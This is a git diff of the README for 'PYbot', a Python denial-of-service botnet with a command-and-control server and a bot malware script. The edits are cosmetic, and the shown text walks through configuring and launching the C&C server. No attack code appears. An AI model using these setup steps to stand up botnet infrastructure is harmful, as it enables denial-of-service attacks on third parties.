@@ -1,4 +1,6 @@
-<h1 align="center">3301 PYbot Botnet</h1>
+<h1 align="center">PYbot Botnet</h1>
+
+![preview](/preview.png)
 
 **PYbot** is a basic open source [denial of service](https://en.wikipedia.org/wiki/Denial-of-service_attack) [botnet](https://en.wikipedia.org/wiki/Botnet) system written in Python 3, consists of a connect and control server and a bot malware script.
 
@@ -34,9 +36,9 @@ exit \| logout | Disconnects from the C&C server
 1. Install Git and Python 3 on your server.
 2. Clone the PYbot Github repository to your server.
 3. Change the host address and CnC port in the configuration section in [bot.py](/bot.py) to your server address.
-4. Start the server by running `$ python cnc.py \<cnc port>`.
+4. Start the server by executing the command `$ python cnc.py <cnc port>`.
 5. Add accounts in [logins.txt](/logins.txt) by using the format: `username:password`.
-6. Connect to the server via Putty in a raw socket connection.
+6. Connect to the server via [PuTTY](https://www.putty.org/) in a raw socket connection.
 
 *Compiling the malware and installing it on vulnerable devices won't be told, as it's highly illegal to do. Use of this project for illegal activities is at own risk! I'm not responsible for any of your taken actions!*
 
